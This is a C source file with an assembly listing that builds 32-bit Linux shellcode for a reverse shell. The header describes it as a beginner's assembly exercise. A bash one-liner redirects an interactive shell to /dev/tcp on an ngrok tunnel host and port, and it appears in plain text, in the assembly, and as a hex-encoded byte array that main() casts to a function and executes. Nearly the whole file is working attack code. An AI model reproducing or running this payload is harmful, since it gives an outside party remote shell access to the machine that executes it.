// title  : /dev/tcp/ngrok execv call 
// author : hook.vap0r
// source : https://github.com/hook-s3c/shell-noob
// notes  : all instructions to get from zero to a reverse shell bind can be found
// 					on the github repo - not bad for a hello-world to assembly!

// /bin/bash -c "/bin/bash -i >& /dev/tcp/0.tcp.xx.ngrok.io/12345 0>&1"


/* assembly...

BITS 32

global _start 

section .text

_start:


jmp short       forward

back:
pop             esi               ; grab the last line
xor             eax, eax          ; I believe eax is now NULL

; store stuff
mov byte        [esi + 9], al     ; terminate /bin/bash
mov byte        [esi + 12], al    ; terminate -c
mov byte        [esi + 66], al    ; terminate /bin/shi -i ... 

; move stuff
mov long        [esi + 67], esi   ; address of /bin/bash in AAAA
lea             ebx, [esi + 10]    ; get address of -c  
mov long        [esi + 71], ebx   ; store address of -c in BBBB 
lea             ebx, [esi + 13]   ; get address of /bin/bash -i ... 
mov long        [esi + 75], ebx   ; store address of /bin/bash -i ... in CCCC
mov long        [esi + 79], eax   ; put NULL in DDDD

; running stuff
mov byte        al, 0x0b          ; pass the execve syscall number as argument
mov             ebx, esi          
lea             ecx, [esi + 67]   ; /bin/bash -c /bin/bash ....
lea             edx, [esi + 79]   ; NULL
int             0x80              ; Run the execve syscall

forward:
call            back
db "/bin/bash#-c#/bin/bash -i >& /dev/tcp/0.tcp.xx.ngrok.io/12345 0>&1#AAAABBBBCCCCDDDD"

*/

#include<stdio.h>
#include<string.h>

unsigned char shellcode[] =
	"\xeb\x2a\x5e\x31\xc0\x88\x46\x09\x88\x46\x0c\x88\x46\x42\x89"
	"\x76\x43\x8d\x5e\x0a\x89\x5e\x47\x8d\x5e\x0d\x89\x5e\x4b\x89"
	"\x46\x4f\xb0\x0b\x89\xf3\x8d\x4e\x43\x8d\x56\x4f\xcd\x80\xe8"
	"\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x23\x2d"
	"\x63\x23\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x69\x20"
	"\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x30\x2e\x74"
	"\x63\x70\x2e\x78\x78\x2e\x6e\x67\x72\x6f\x6b\x2e\x69\x6f\x2f"
	"\x31\x32\x33\x34\x35\x20\x30\x3e\x26\x31\x23\x41\x41\x41\x41"
	"\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44";




int main()
{
 
    printf("shellcode Length:  %ld\n", strlen(shellcode));
 
    int (*ret)() = (int(*)())shellcode;
 
    ret();
 
}
